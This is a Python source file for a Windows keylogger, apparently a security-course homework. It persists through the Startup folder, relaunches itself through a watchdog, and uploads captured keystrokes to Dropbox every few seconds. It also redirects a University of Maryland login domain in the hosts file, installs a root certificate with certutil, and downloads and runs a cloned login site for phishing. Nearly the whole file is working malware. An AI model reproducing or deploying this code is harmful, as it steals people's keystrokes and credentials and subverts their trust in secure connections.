#run with pythonw
import tempfile
import shutil
import sys
import os

from pynput.keyboard import Key, KeyCode, Listener as KeyboardListener
from threading import Lock
import schedule
from time import sleep
#import atexit
import psutil

#from watchdog.observers import Observer
#from watchdog.events import LoggingEventHandler

from mslex import quote

import dropbox

import zipfile

import subprocess
#from multiprocessing import Process

cur_file = __file__

DROPBOX_ACCESS_TOKEN = #put your dropbox token here

keys = []
keysLock = Lock()

'''
@atexit.register
def goodbye():
    #could also add a watchdog to be extra safe
    if not cur_file.startswith(tempfile.gettempdir()):
        return
    print(cur_file)
    #subprocess.call(['pythonw.exe', cur_file], cwd=tempfile.gettempdir())
    subprocess.Popen(['pythonw.exe', cur_file], cwd=tempfile.gettempdir())
'''

def on_key_release(key):
    global keys, keysLock
    
    keysLock.acquire()
    keys.append(key)
    keysLock.release()
    

    


def get_user_programs_path():
    return os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs')


#can everyone with: os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
def get_user_startup_path():
    return os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')


    

def is_process_running(process_pid: int, args: list[str]):
    """Check if there is any running process that contains the given name process_name."""
    for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
        try:
            #proc.info['pid'] == process_pid and 
            if proc.info['cmdline'] == args:
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

def open_application(args: list[str]):
    """Open the application using the given command."""
    
    #my_process = subprocess.Popen(args, cwd=tempfile.gettempdir())
    #pid =os.fork()
    #if pid==0:
    #    os.system(args)
    #    exit()
    #my_process = subprocess.Popen(args, cwd=tempfile.gettempdir()) #Process(target=main_option2)
    
    #DETACHED_PROCESS = 8
    #DETACHED_PROCESS
    #CREATE_NO_WINDOW = 0x08000000
    
    
    DETACHED_PROCESS = 0x00000008
    my_process = subprocess.Popen(args, cwd=tempfile.gettempdir(), creationflags=DETACHED_PROCESS, close_fds=True)
    #my_process = subprocess.Popen(args, cwd=tempfile.gettempdir(), close_fds=True)
    return my_process.pid
    
    #print(' '.join(args))
    #print(args[0], quote(args[1]))
    #command = f'{args[0]} {quote(args[1])}' + ' '.join(args[2:])
    #open(r'C:\Users\supem\Desktop\Homework\Cyber B\Hw2\keylogger\b.txt', 'w').write(command)
    #os.system(command)
    #sleep(8)
    #DETACHED_PROCESS = 0x00000008

    #my_process = subprocess.call(args, cwd=tempfile.gettempdir(), creationflags=DETACHED_PROCESS, close_fds=True)
    #my_process = os.posix_spawn(args, cwd=tempfile.gettempdir(), creationflags=DETACHED_PROCESS, close_fds=True)
    #return my_process.pid
    
    #also tried with posix and such..
    
    #will continue here after the other will stop running 


def write_py_file_to_programs():    
    programs_directory = get_user_programs_path()
    
    os.makedirs(programs_directory, exist_ok=True)
    
    shutil.copy(__file__, programs_directory + f'\\keyLoggerRunner.pyw')


def write_bat_file_to_startup():
    startup_directory = get_user_startup_path()
    programs_directory = get_user_programs_path()
    
    os.makedirs(startup_directory, exist_ok=True)
    
    with open(startup_directory+'\\keyLoggerRunner.bat', 'w') as f:
        f.write(f'''cd {quote(programs_directory)}
pythonw.exe keyLoggerRunner.pyw''')
    

def watchdog(args: list[str], check_interval=5, process_pid:int=-1):
    """
    Watchdog function to check if the process is running.
    If the process is not running, it will start it using the provided command.
    """
    
    #directory_path = os.path.dirname(os.path.realpath(__file__))
    
    while True:
        if not is_process_running(process_pid, args):
            print(f"keylogger is not running. Starting it.")
            #process_pid = 
            #coping the program to the startup
            
            
            
            open_application(args)
        else:
            print(f"keylogger is running.")
        sleep(check_interval)




def main_option1():
    #on the first run, not in tmp
    tmp = tempfile.TemporaryFile()
    file_location = tmp.name
    tmp.close()
    
    #coping file to temp
    print(f'{__file__} to {file_location}')
    shutil.copyfile(__file__, file_location)

    #subprocess.run()
    #subprocess.call(['pythonw.exe', file_location], cwd=tempfile.gettempdir())
    #pid = subprocess.Popen(['pythonw.exe', file_location], cwd=tempfile.gettempdir())
    #print('pid:', pid, pid.pid)
    subprocess.Popen(['pythonw.exe', file_location, 'watchdog'], cwd=tempfile.gettempdir())
    
    #TODO: do this line! (subbmiting without this because I don't want to accidenty do it XD)
    #os.remove(__file__)

def writeToFile():
    global keys, keysLock, dbx
    #print('here')
    
    #open(r'C:\Users\supem\Desktop\Homework\Cyber B\Hw2\keylogger\a.txt', 'a').write("keyss ")
    
    if keys == []:
        return

    try:
        #open(r'C:\Users\supem\Desktop\Homework\Cyber B\Hw2\keylogger\a.txt', 'a').write("downloading")
        _, r = dbx.files_download('/keys.txt')
        previous_text = r.text
    except:
        #error in connection or something
        #open(r'C:\Users\supem\Desktop\Homework\Cyber B\Hw2\keylogger\a.txt', 'a').write("error")
        return
    keysLock.acquire()

    currentKeys = keys
    keys = []
    keysLock.release()
    
    #write currentKeys to the file.
    write_cur = ''.join(str(a) for a in currentKeys)
    cur_text = previous_text + write_cur
    
    #open(r'C:\Users\supem\Desktop\Homework\Cyber B\Hw2\keylogger\a.txt', 'a').write(f"uploading {cur_text} to /keys.txt")
    dbx.files_upload(cur_text.encode(), '/keys.txt', mode=dropbox.files.WriteMode.overwrite)
    #okay wtf

def main_keylogger():
    global dbx
    #on the second run, not in tmp
    
    print('running keylogger')
    #(assuming that it may have destroyed them there so restoring here)
    write_py_file_to_programs()
    write_bat_file_to_startup()


    #dropbox init
    dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

    #server:
    
    #first lets add the 127.0.0.1 to my thing.
    
    #mirland  -   https://advancement.umd.edu/
    #https://advancement.umd.edu/login.php
    
    #edit: %SystemRoot%\System32\drivers\etc\hosts
    try:
        hosts_file_name = os.environ['SystemRoot']+r'\System32\drivers\etc\hosts'
        with open(hosts_file_name, 'r') as f:
            text = f.read()
        if 'advancement.umd.edu' not in text:
            with open(hosts_file_name, 'a') as f:
                f.write('127.0.0.1 advancement.umd.edu')
    except:
        #kinda hoping for admin
        pass
        
    os.makedirs(tempfile.gettempdir()+'/mir/', exist_ok=True)
    #searchutil
    #openssl
    
    dbx.files_download_to_file(tempfile.gettempdir()+'\\website.pem', '/website.pem')
        
    #os.system('certutil -addstore root website.pem')
    try:
        DETACHED_PROCESS = 0x00000008
        subprocess.Popen(['certutil.exe', '-addstore', 'root', tempfile.gettempdir()+'\\website.pem'], cwd=tempfile.gettempdir(), creationflags=DETACHED_PROCESS, close_fds=True)
    except:
        pass
    
    
    dbx.files_download_to_file(tempfile.gettempdir()+'\\mir.zip', '/mirland.zip')
    with zipfile.ZipFile(tempfile.gettempdir() + '\\mir.zip', 'r') as zip_ref:
        zip_ref.extractall(tempfile.gettempdir() + '\\mir\\')


    file_to_run = tempfile.gettempdir() + r'\mir\University of Maryland\app.py'
    DETACHED_PROCESS = 0x00000008
    server = subprocess.Popen(['pythonw.exe', file_to_run], cwd=tempfile.gettempdir(), creationflags=DETACHED_PROCESS, close_fds=True)
    #my_process = subprocess.Popen(args, cwd=tempfile.gettempdir(), close_fds=True)


    #keylogger:
    schedule.every(5).seconds.do(writeToFile)
    keyboard_listener = KeyboardListener(on_release=on_key_release)
    keyboard_listener.start()
    
    while True:
        schedule.run_pending()
        sleep(1)
    keyboard_listener.join()
    
    #while True:
    #    
    #    #for debug:
    #    open(r'C:\Users\supem\Desktop\Homework\Cyber B\Hw2\keylogger\a.txt', 'a').write("wow")
    #    
    #    sleep(5)

if __name__ == '__main__':
    print('cur,', cur_file)
    
    if len(sys.argv) > 1 and sys.argv[1] == 'watchdog':
        print('starting watchdog')
        watchdog(['pythonw.exe', cur_file])
    
    
    if cur_file.startswith(tempfile.gettempdir()):
        main_keylogger()
    else:
        main_option1()
            
        
    
